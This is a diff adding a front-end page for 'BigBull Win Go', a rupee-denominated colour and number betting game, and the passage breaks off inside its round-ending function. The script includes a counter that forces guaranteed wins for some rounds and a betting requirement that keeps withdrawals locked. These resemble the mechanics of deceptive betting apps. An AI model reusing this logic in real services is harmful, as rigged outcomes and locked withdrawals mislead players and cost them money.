@@ -1,0 +1,1489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>BigBull - Win Go</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #ff3b3b;
+            --secondary-color: #ff5252;
+            --green-color: #4CAF50;
+            --purple-color: #9c27b0;
+            --red-color: #f44336;
+            --orange-color: #ff9800;
+            --blue-color: #2196f3;
+            --text-color: #ffffff;
+            --dark-text: #333333;
+            --light-bg: #f5f5f5;
+            --card-bg: #ffffff;
+            --header-height: 60px;
+            --theme-gradient: linear-gradient(135deg, #9c27b0, #673ab7);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+            transition: all 0.2s ease;
+        }
+
+        body {
+            background: #f0f0f0;
+            color: var(--dark-text);
+            height: 100vh;
+            width: 100vw;
+            overflow-x: hidden;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .app-container {
+            max-width: 500px;
+            width: 100%;
+            margin: 0 auto;
+            height: 100vh;
+            background: #f0f0f0;
+            position: relative;
+            overflow-y: auto;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            height: var(--header-height);
+            background: var(--theme-gradient);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            color: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+
+        .header-logo { 
+            font-size: 24px; 
+            font-weight: bold; 
+            background: linear-gradient(135deg, #ffeb3b, #ff3b3b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        .header-icon { font-size: 24px; cursor: pointer; color: white; }
+
+        .balance-display {
+            padding: 15px 20px;
+            background: var(--theme-gradient);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+            margin: 10px;
+            border-radius: 10px;
+        }
+
+        .balance-amount { font-weight: bold; font-size: 18px; }
+        .balance-actions { display: flex; gap: 15px; }
+
+        .balance-action {
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .balance-action.home { background: var(--blue-color); }
+        .balance-action.deposit { background: var(--green-color); }
+        .balance-action:hover { background: var(--secondary-color); transform: translateY(-2px); }
+
+        .game-info {
+            margin: 15px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .game-info::before {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            background: linear-gradient(45deg, #ff3b3b, #ff9800, #4CAF50, #2196f3, #9c27b0);
+            border-radius: 18px;
+            z-index: -1;
+            animation: borderAnimation 3s linear infinite;
+        }
+
+        @keyframes borderAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .how-to-play {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background: var(--theme-gradient);
+            color: white;
+            border-radius: 15px 15px 0 0;
+        }
+        .how-to-play-icon { margin-right: 10px; font-size: 20px; }
+        .game-results {
+            display: flex;
+            justify-content: space-around;
+            padding: 15px;
+            background: var(--theme-gradient);
+        }
+        .result-ball {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 18px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            color: white;
+            will-change: transform;
+            transition: transform 0.3s ease;
+        }
+        .result-ball:hover {
+            transform: scale(1.1);
+        }
+        .result-ball.green { background: var(--green-color); }
+        .result-ball.red { background: var(--red-color); }
+        .result-ball.purple { background: var(--purple-color); }
+        .timer-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: var(--theme-gradient);
+            color: white;
+        }
+        .timer-label { font-size: 16px; font-weight: bold; }
+        .timer-display {
+            display: flex;
+            align-items: center;
+        }
+        .timer-digit {
+            width: 35px;
+            height: 45px;
+            background: white;
+            color: var(--purple-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0 3px;
+            border-radius: 5px;
+            will-change: transform;
+        }
+        .period-number {
+            font-size: 16px;
+            font-weight: bold;
+            text-align: center;
+            padding: 15px;
+            background: var(--theme-gradient);
+            color: white;
+            border-radius: 0 0 15px 15px;
+        }
+
+        .betting-section { margin: 15px; }
+        .color-options, .number-options, .size-options {
+            display: grid;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .color-options { grid-template-columns: repeat(3, 1fr); }
+        .number-options {
+            grid-template-columns: repeat(5, 1fr);
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .size-options { grid-template-columns: 1fr 1fr; }
+        .color-option, .number-option, .size-option {
+            height: 50px;
+            border-radius: 25px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            color: white;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: transform 0.2s, filter 0.2s, box-shadow 0.3s;
+            touch-action: manipulation;
+            will-change: transform, box-shadow;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .color-option::before, .number-option::before, .size-option::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: rotate(45deg);
+            z-index: 1;
+            transition: all 0.6s ease;
+        }
+
+        .color-option:hover::before, .number-option:hover::before, .size-option:hover::before {
+            top: -100%;
+            left: -100%;
+        }
+
+        .color-option:active, .number-option:active, .size-option:active {
+            transform: scale(0.95);
+        }
+        .color-option.green { background: var(--green-color); }
+        .color-option.purple { background: var(--purple-color); }
+        .color-option.red { background: var(--red-color); }
+        .size-option.big { background: var(--orange-color); }
+        .size-option.small { background: var(--blue-color); }
+        .number-option {
+            aspect-ratio: 1;
+            border-radius: 50%;
+            position: relative;
+            overflow: hidden;
+        }
+        .number-option span { position: relative; z-index: 3; }
+        .number-0 { background: linear-gradient(135deg, var(--purple-color), var(--blue-color)); }
+        .number-1, .number-3, .number-5, .number-7, .number-9 { background: linear-gradient(135deg, var(--green-color), #8bc34a); }
+        .number-2, .number-4, .number-6, .number-8 { background: linear-gradient(135deg, var(--red-color), #e57373); }
+        .multiplier-options {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            gap: 10px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            padding-bottom: 5px;
+        }
+        .multiplier-option {
+            min-width: 60px;
+            height: 40px;
+            border-radius: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            background: #f0f0f0;
+            cursor: pointer;
+            transition: background 0.2s, filter 0.2s, transform 0.2s;
+            touch-action: manipulation;
+            will-change: transform;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .multiplier-option:active {
+            transform: scale(0.95);
+        }
+        .multiplier-option.active { background: var(--purple-color); color: white; }
+        .random-bet { 
+            background: white; 
+            border: 2px solid var(--purple-color); 
+            color: var(--purple-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .random-bet::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(156, 39, 176, 0.1);
+            transform: rotate(45deg);
+            z-index: 1;
+            transition: all 0.6s ease;
+        }
+
+        .random-bet:hover::after {
+            top: -100%;
+            left: -100%;
+        }
+
+        .history-tabs {
+            display: flex;
+            margin: 15px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .history-tab {
+            flex: 1;
+            padding: 15px;
+            text-align: center;
+            background: var(--theme-gradient);
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .history-tab.active { 
+            background: linear-gradient(135deg, #673ab7, #9c27b0);
+        }
+        .game-records {
+            margin: 15px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .game-records::before {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            background: linear-gradient(45deg, #ff3b3b, #ff9800, #4CAF50, #2196f3, #9c27b0);
+            border-radius: 13px;
+            z-index: -1;
+            animation: borderAnimation 3s linear infinite;
+        }
+
+        .record-header {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            background: var(--theme-gradient);
+            color: white;
+            padding: 15px;
+            font-weight: bold;
+            text-align: center;
+            font-size: 14px;
+        }
+        .my-record-header {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr 1fr;
+            background: var(--theme-gradient);
+            color: white;
+            padding: 15px;
+            font-weight: bold;
+            text-align: center;
+            font-size: 14px;
+        }
+        .record-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+            text-align: center;
+            align-items: center;
+            font-size: 14px;
+        }
+        .my-record-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr 1fr;
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+            text-align: center;
+            align-items: center;
+            font-size: 14px;
+        }
+        .record-number { font-size: 20px; font-weight: bold; }
+        .record-number.green { color: var(--green-color); }
+        .record-number.red { color: var(--red-color); }
+        .record-number.purple { color: var(--purple-color); }
+        .record-indicator {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .record-indicator.green { background: var(--green-color); }
+        .record-indicator.red { background: var(--red-color); }
+        .record-indicator.purple { background: var(--purple-color); }
+
+        .bet-slip {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+            z-index: 90;
+            padding: 20px;
+            border-radius: 15px 15px 0 0;
+            display: none;
+        }
+        .bet-slip-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .bet-slip-title { font-weight: bold; font-size: 18px; }
+        .close-slip { font-size: 24px; cursor: pointer; }
+        .bet-details { margin-bottom: 20px; }
+        .bet-detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        .bet-label { color: #777; font-size: 14px; }
+        .bet-value { font-weight: bold; font-size: 14px; }
+        .bet-amount-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        .confirm-bet-button {
+            width: 100%;
+            padding: 15px;
+            background: var(--theme-gradient);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s;
+            margin-bottom: 10px;
+            will-change: transform;
+        }
+        .confirm-bet-button:hover { 
+            background: linear-gradient(135deg, #673ab7, #9c27b0);
+            transform: translateY(-2px);
+        }
+        .cancel-bet-button {
+            width: 100%;
+            padding: 15px;
+            background: #f0f0f0;
+            color: var(--dark-text);
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .cancel-bet-button:hover { background: #e0e0e0; }
+
+        .custom-alert {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            max-width: 300px;
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            z-index: 3001;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .alert-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: var(--purple-color);
+        }
+        .alert-message { margin-bottom: 20px; color: #333; }
+        .alert-button {
+            padding: 10px 20px;
+            background: var(--theme-gradient);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s;
+            will-change: transform;
+        }
+        .alert-button:hover {
+            background: linear-gradient(135deg, #673ab7, #9c27b0);
+            transform: translateY(-2px);
+        }
+
+        .betting-option.selected { 
+            box-shadow: 0 0 0 3px #ffeb3b, 0 4px 10px rgba(0,0,0,0.2); 
+            transform: scale(1.05); 
+        }
+        .betting-option.disabled, .multiplier-option.disabled { 
+            filter: blur(1px); 
+            pointer-events: none; 
+            opacity: 0.7; 
+        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .pulse-animation { animation: pulse 1.5s infinite; }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 3000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .loading-text { color: white; font-size: 16px; font-weight: bold; }
+        .loading-bar {
+            width: 200px;
+            height: 20px;
+            background: #ddd;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        .loading-bar::after {
+            content: '';
+            position: absolute;
+            width: 50%;
+            height: 100%;
+            background: var(--purple-color);
+            animation: load 1.5s infinite ease-in-out;
+            will-change: transform;
+        }
+        @keyframes load { 0% { left: -50%; } 50% { left: 100%; } 100% { left: -50%; } }
+
+        .result-banner {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            z-index: 3500;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.3);
+            animation: fadeInOut 2s ease-in-out;
+            will-change: transform, opacity;
+        }
+        
+        .win-banner {
+            background: linear-gradient(135deg, #4CAF50, #8BC34A);
+            color: white;
+            border: 3px solid gold;
+        }
+        
+        .loss-banner {
+            background: linear-gradient(135deg, #607D8B, #455A64);
+            color: white;
+            border: 3px solid #B0BEC5;
+        }
+        
+        .result-banner-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        
+        .result-banner-amount {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+            20% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+            80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+            100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+        }
+
+        @media (max-width: 500px) {
+            .header-logo { font-size: 20px; }
+            .balance-amount { font-size: 16px; }
+            .balance-action { padding: 8px 15px; font-size: 12px; }
+            .result-ball { width: 30px; height: 30px; font-size: 16px; }
+            .timer-digit { width: 30px; height: 40px; font-size: 20px; }
+            .color-option, .number-option, .size-option { height: 45px; font-size: 14px; }
+            .multiplier-option { min-width: 50px; height: 35px; font-size: 14px; }
+            .record-row, .record-header { font-size: 12px; }
+            .my-record-row, .my-record-header { font-size: 12px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container" id="app-container">
+        <div class="header">
+            <div class="header-logo">BIGBULL</div>
+            <div class="header-icon"><i class="fas fa-headset"></i></div>
+        </div>
+        <div class="balance-display">
+            <div class="balance-amount">Balance: ₹<span id="balance-amount">0.00</span></div>
+            <div class="balance-actions">
+                <div class="balance-action home" id="home-button">Home</div>
+                <div class="balance-action deposit" id="deposit-button">Deposit</div>
+            </div>
+        </div>
+        <div class="game-section">
+            <div class="game-info">
+                <div class="how-to-play">
+                    <div class="how-to-play-icon"><i class="fas fa-info-circle"></i></div>
+                    <div class="game-name">Win Go 1Min</div>
+                </div>
+                <div class="game-results" id="game-results">
+                    <div class="result-ball green">5</div>
+                    <div class="result-ball red">2</div>
+                    <div class="result-ball green">5</div>
+                    <div class="result-ball red">3</div>
+                    <div class="result-ball red">8</div>
+                </div>
+                <div class="timer-section">
+                    <div class="timer-label">Time Remaining</div>
+                    <div class="timer-display">
+                        <div class="timer-digit" id="timer-sec-tens">0</div>
+                        <div class="timer-digit" id="timer-sec-ones">0</div>
+                    </div>
+                </div>
+                <div class="period-number" id="period-number">202503220437</div>
+            </div>
+            <div class="betting-section">
+                <div class="color-options">
+                    <div class="color-option green betting-option" data-type="color" data-value="green" data-odds="2">Green</div>
+                    <div class="color-option purple betting-option" data-type="color" data-value="purple" data-odds="5">Purple</div>
+                    <div class="color-option red betting-option" data-type="color" data-value="red" data-odds="2">Red</div>
+                </div>
+                <div class="number-options">
+                    <div class="number-option number-0 betting-option" data-type="number" data-value="0" data-odds="10"><span>0</span></div>
+                    <div class="number-option number-1 betting-option" data-type="number" data-value="1" data-odds="10"><span>1</span></div>
+                    <div class="number-option number-2 betting-option" data-type="number" data-value="2" data-odds="10"><span>2</span></div>
+                    <div class="number-option number-3 betting-option" data-type="number" data-value="3" data-odds="10"><span>3</span></div>
+                    <div class="number-option number-4 betting-option" data-type="number" data-value="4" data-odds="10"><span>4</span></div>
+                    <div class="number-option number-5 betting-option" data-type="number" data-value="5" data-odds="10"><span>5</span></div>
+                    <div class="number-option number-6 betting-option" data-type="number" data-value="6" data-odds="10"><span>6</span></div>
+                    <div class="number-option number-7 betting-option" data-type="number" data-value="7" data-odds="10"><span>7</span></div>
+                    <div class="number-option number-8 betting-option" data-type="number" data-value="8" data-odds="10"><span>8</span></div>
+                    <div class="number-option number-9 betting-option" data-type="number" data-value="9" data-odds="10"><span>9</span></div>
+                </div>
+                <div class="multiplier-options">
+                    <div class="multiplier-option random-bet" id="random-bet">Random</div>
+                    <div class="multiplier-option active" data-multiplier="1">X1</div>
+                    <div class="multiplier-option" data-multiplier="5">X5</div>
+                    <div class="multiplier-option" data-multiplier="10">X10</div>
+                    <div class="multiplier-option" data-multiplier="20">X20</div>
+                </div>
+                <div class="size-options">
+                    <div class="size-option big betting-option" data-type="size" data-value="big" data-odds="2">Big</div>
+                    <div class="size-option small betting-option" data-type="size" data-value="small" data-odds="2">Small</div>
+                </div>
+            </div>
+            <div class="history-tabs">
+                <div class="history-tab active" data-tab="game-record">Game Record</div>
+                <div class="history-tab" data-tab="my-record">My Record</div>
+            </div>
+            <div class="game-records" id="game-record-content">
+                <div class="record-header">
+                    <div>Period</div>
+                    <div>Number</div>
+                    <div>Size</div>
+                    <div>Color</div>
+                </div>
+            </div>
+            <div class="game-records" id="my-record-content" style="display: none;">
+                <div class="my-record-header">
+                    <div>Period</div>
+                    <div>Selection</div>
+                    <div>Amount</div>
+                    <div>Result</div>
+                    <div>Win Amount</div>
+                </div>
+            </div>
+        </div>
+        <div class="bet-slip" id="bet-slip">
+            <div class="bet-slip-header">
+                <div class="bet-slip-title">Confirm Bet</div>
+                <div class="close-slip" id="close-slip"><i class="fas fa-times"></i></div>
+            </div>
+            <div class="bet-details">
+                <div class="bet-detail-row">
+                    <div class="bet-label">Period:</div>
+                    <div class="bet-value" id="bet-period"></div>
+                </div>
+                <div class="bet-detail-row">
+                    <div class="bet-label">Selection:</div>
+                    <div class="bet-value" id="bet-selection"></div>
+                </div>
+                <div class="bet-detail-row">
+                    <div class="bet-label">Odds:</div>
+                    <div class="bet-value" id="bet-odds"></div>
+                </div>
+                <div class="bet-detail-row">
+                    <div class="bet-label">Multiplier:</div>
+                    <div class="bet-value" id="bet-multiplier"></div>
+                </div>
+                <div class="bet-detail-row">
+                    <div class="bet-label">Fee (2%):</div>
+                    <div class="bet-value" id="bet-fee">₹0.00</div>
+                </div>
+                <div class="bet-detail-row">
+                    <div class="bet-label">Actual Bet:</div>
+                    <div class="bet-value" id="bet-actual">₹0.00</div>
+                </div>
+            </div>
+            <input type="number" class="bet-amount-input" id="bet-amount" placeholder="Enter amount" min="1" max="10000">
+            <button class="confirm-bet-button" id="confirm-bet">CONFIRM BET</button>
+            <button class="cancel-bet-button" id="cancel-bet">CANCEL</button>
+        </div>
+        <div class="custom-alert" id="custom-alert">
+            <div class="alert-title">Notice</div>
+            <div class="alert-message" id="alert-message"></div>
+            <button class="alert-button" id="alert-button">OK</button>
+        </div>
+        <div class="loading-overlay" id="loading-overlay">
+            <div class="loading-text">Processing...</div>
+            <div class="loading-bar"></div>
+        </div>
+        <div class="result-banner win-banner" id="win-banner">
+            <div class="result-banner-title">You Won!</div>
+            <div class="result-banner-amount" id="win-amount">₹0.00</div>
+        </div>
+        <div class="result-banner loss-banner" id="loss-banner">
+            <div class="result-banner-title">You Lost</div>
+            <div class="result-banner-amount" id="loss-amount">₹0.00</div>
+        </div>
+    </div>
+
+    <script>
+        // Global wallet system
+        const WALLET_KEY = 'bigBullGlobalWallet';
+
+        function loadUserBalance() {
+            const loggedInUser = localStorage.getItem('bigBullLoggedInUser');
+            if (loggedInUser) {
+                const user = JSON.parse(loggedInUser);
+                return parseFloat(localStorage.getItem(WALLET_KEY)) || user.balance || 40.00;
+            }
+            return 40.00;
+        }
+
+        function saveUserBalance(balance) {
+            const loggedInUser = localStorage.getItem('bigBullLoggedInUser');
+            if (loggedInUser) {
+                const user = JSON.parse(loggedInUser);
+                user.balance = balance;
+                localStorage.setItem('bigBullLoggedInUser', JSON.stringify(user));
+                localStorage.setItem(WALLET_KEY, balance.toFixed(2));
+                const userData = localStorage.getItem(`bigBullUser_${user.mobile}`);
+                if (userData) {
+                    const userObj = JSON.parse(userData);
+                    userObj.balance = balance;
+                    localStorage.setItem(`bigBullUser_${user.mobile}`, JSON.stringify(userObj));
+                }
+            }
+        }
+
+        function updateBettingProgress(betAmount) {
+            const loggedInUser = localStorage.getItem('bigBullLoggedInUser');
+            if (loggedInUser) {
+                const user = JSON.parse(loggedInUser);
+                if (user.needsBetting) {
+                    user.totalBetAmount = (user.totalBetAmount || 0) + betAmount;
+                    localStorage.setItem('bigBullLoggedInUser', JSON.stringify(user));
+                    const userData = localStorage.getItem(`bigBullUser_${user.mobile}`);
+                    if (userData) {
+                        const userObj = JSON.parse(userData);
+                        userObj.totalBetAmount = user.totalBetAmount;
+                        localStorage.setItem(`bigBullUser_${user.mobile}`, JSON.stringify(userObj));
+                    }
+                }
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Game variables
+            let balance = loadUserBalance();
+            let betAmount = 0;
+            let selectedOption = null;
+            let selectedMultiplier = 1;
+            let currentPeriod = localStorage.getItem('currentPeriod') || generatePeriodNumber();
+            let timerSeconds = 60;
+            let gameHistory = JSON.parse(localStorage.getItem('gameHistory')) || [];
+            let myBets = JSON.parse(localStorage.getItem('myBets')) || [];
+            let betPlaced = false;
+            let totalBetAmount = parseFloat(localStorage.getItem('totalBetAmount')) || 0;
+            let withdrawalUnlocked = localStorage.getItem('withdrawalUnlocked') === 'true';
+            let betRequirement = 400;
+            let guaranteedWinCount = parseInt(localStorage.getItem('guaranteedWinCount')) || 0;
+
+            // DOM elements
+            const balanceDisplay = document.getElementById('balance-amount');
+            const periodDisplay = document.getElementById('period-number');
+            const timerSecTens = document.getElementById('timer-sec-tens');
+            const timerSecOnes = document.getElementById('timer-sec-ones');
+            const betSlip = document.getElementById('bet-slip');
+            const betPeriod = document.getElementById('bet-period');
+            const betSelection = document.getElementById('bet-selection');
+            const betOdds = document.getElementById('bet-odds');
+            const betMultiplier = document.getElementById('bet-multiplier');
+            const betFee = document.getElementById('bet-fee');
+            const betActual = document.getElementById('bet-actual');
+            const betAmountInput = document.getElementById('bet-amount');
+            const confirmBetButton = document.getElementById('confirm-bet');
+            const cancelBetButton = document.getElementById('cancel-bet');
+            const closeSlipButton = document.getElementById('close-slip');
+            const bettingOptions = document.querySelectorAll('.betting-option');
+            const multiplierOptions = document.querySelectorAll('.multiplier-option:not(#random-bet)');
+            const randomBetButton = document.getElementById('random-bet');
+            const gameRecordContent = document.getElementById('game-record-content');
+            const myRecordContent = document.getElementById('my-record-content');
+            const historyTabs = document.querySelectorAll('.history-tab');
+            const customAlert = document.getElementById('custom-alert');
+            const alertMessage = document.getElementById('alert-message');
+            const alertButton = document.getElementById('alert-button');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const winBanner = document.getElementById('win-banner');
+            const lossBanner = document.getElementById('loss-banner');
+            const winAmount = document.getElementById('win-amount');
+            const lossAmount = document.getElementById('loss-amount');
+            const homeButton = document.getElementById('home-button');
+            const depositButton = document.getElementById('deposit-button');
+            const gameResults = document.getElementById('game-results');
+
+            // Sync balance across tabs
+            window.addEventListener('storage', function(e) {
+                if (e.key === WALLET_KEY) {
+                    balance = parseFloat(e.newValue) || balance;
+                    updateBalance();
+                }
+            });
+
+            // Initialize
+            updateBalance();
+            initializeGameHistory();
+            displayGameHistory();
+            displayMyBets();
+            startTimer();
+
+            // Event listeners
+            bettingOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    selectBettingOption(this);
+                });
+            });
+
+            multiplierOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    selectMultiplier(this);
+                });
+            });
+
+            randomBetButton.addEventListener('click', selectRandomBet);
+            confirmBetButton.addEventListener('click', confirmBet);
+            cancelBetButton.addEventListener('click', closeBetSlip);
+            closeSlipButton.addEventListener('click', closeBetSlip);
+            alertButton.addEventListener('click', closeAlert);
+
+            historyTabs.forEach(tab => {
+                tab.addEventListener('click', function() {
+                    switchTab(this);
+                });
+            });
+
+            homeButton.addEventListener('click', function() {
+                saveUserBalance(balance);
+                window.location.href = 'index.html';
+            });
+
+            depositButton.addEventListener('click', function() {
+                saveUserBalance(balance);
+                window.location.href = 'index.html?tab=deposit';
+            });
+
+            betAmountInput.addEventListener('input', function() {
+                updateBetDetails();
+            });
+
+            // Keyboard navigation
+            document.addEventListener('keydown', function(event) {
+                if (event.key === 'Escape') {
+                    closeBetSlip();
+                    closeAlert();
+                }
+            });
+
+            // Functions
+            function updateBalance() {
+                balanceDisplay.textContent = balance.toFixed(2);
+                saveUserBalance(balance);
+            }
+
+            function generatePeriodNumber() {
+                const now = new Date();
+                const year = now.getFullYear();
+                const month = String(now.getMonth() + 1).padStart(2, '0');
+                const day = String(now.getDate()).padStart(2, '0');
+                const hours = String(now.getHours()).padStart(2, '0');
+                const minutes = String(now.getMinutes()).padStart(2, '0');
+                const seconds = String(now.getSeconds()).padStart(2, '0');
+                return `${year}${month}${day}${hours}${minutes}${seconds}`;
+            }
+
+            function initializeGameHistory() {
+                if (gameHistory.length === 0) {
+                    const initialResults = [
+                        { number: 5, color: 'green', size: 'big' },
+                        { number: 2, color: 'red', size: 'small' },
+                        { number: 5, color: 'green', size: 'big' },
+                        { number: 3, color: 'green', size: 'small' },
+                        { number: 8, color: 'red', size: 'big' }
+                    ];
+                    initialResults.forEach((result, index) => {
+                        const period = new Date();
+                        period.setSeconds(period.getSeconds() - (initialResults.length - index) * 60);
+                        const periodStr = generatePeriodNumberAt(period);
+                        gameHistory.push({
+                            period: periodStr,
+                            number: result.number,
+                            color: result.color,
+                            size: result.size
+                        });
+                    });
+                    localStorage.setItem('gameHistory', JSON.stringify(gameHistory));
+                }
+                updateGameResults();
+            }
+
+            function generatePeriodNumberAt(date) {
+                const year = date.getFullYear();
+                const month = String(date.getMonth() + 1).padStart(2, '0');
+                const day = String(date.getDate()).padStart(2, '0');
+                const hours = String(date.getHours()).padStart(2, '0');
+                const minutes = String(date.getMinutes()).padStart(2, '0');
+                const seconds = String(date.getSeconds()).padStart(2, '0');
+                return `${year}${month}${day}${hours}${minutes}${seconds}`;
+            }
+
+            function updateGameResults() {
+                while (gameResults.firstChild) {
+                    gameResults.removeChild(gameResults.firstChild);
+                }
+                const recentGames = gameHistory.slice(-5).reverse();
+                recentGames.forEach(game => {
+                    const ball = document.createElement('div');
+                    ball.className = `result-ball ${game.color}`;
+                    ball.textContent = game.number;
+                    gameResults.appendChild(ball);
+                });
+            }
+
+            function startTimer() {
+                periodDisplay.textContent = currentPeriod;
+
+                const timer = setInterval(() => {
+                    timerSeconds--;
+
+                    if (timerSeconds < 0) {
+                        clearInterval(timer);
+                        endRound();
+                        return;
+                    }
+
+                    const tens = Math.floor(timerSeconds / 10);
+                    const ones = timerSeconds % 10;
+
+                    timerSecTens.textContent = tens;
+                    timerSecOnes.textContent = ones;
+
+                    if (timerSeconds <= 10) {
+                        timerSecTens.classList.add('pulse-animation');
+                        timerSecOnes.classList.add('pulse-animation');
+                    } else {
+                        timerSecTens.classList.remove('pulse-animation');
+                        timerSecOnes.classList.remove('pulse-animation');
+                    }
+
+                    if (timerSeconds <= 5) {
+                        bettingOptions.forEach(option => {
+                            option.classList.add('disabled');
+                        });
+                        multiplierOptions.forEach(option => {
+                            option.classList.add('disabled');
+                        });
+                        randomBetButton.classList.add('disabled');
+                    }
+                }, 1000);
+            }
+
+            function endRound() {
+                let result;
+                if (guaranteedWinCount > 0 && myBets.length > 0) {
+                    result = generateGuaranteedWinResult();
+                    guaranteedWinCount--;
+                    localStorage.setItem('guaranteedWinCount', guaranteedWinCount);
+                } else {
+                    result = generateResult();
+                }
+
+                const resultNumber = result.number;
+                const resultColor = result.color;
+                const resultSize = result.size;
+
+                // Add to game history
